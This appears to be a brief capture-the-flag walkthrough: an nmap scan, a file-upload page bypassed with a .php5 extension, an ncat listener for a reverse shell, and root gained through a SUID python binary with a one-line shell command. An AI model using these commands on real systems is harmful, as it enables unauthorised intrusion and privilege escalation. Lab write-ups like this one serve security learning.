1 ~ Nmap scan  
``` nmap -sC -sV -A IP  ```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http


2 ~ With gobuster found /panel/ where we can upload files. Php is on blacklist so I tried php5 and it worked :D 
Then listen incoming connections with ncat -lvnp 4444

3 ~ So we now know that /usr/python has SUID bit set, we can escalate our privileges with command:

/usr/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

4 ~ Grab root.txt and done :D
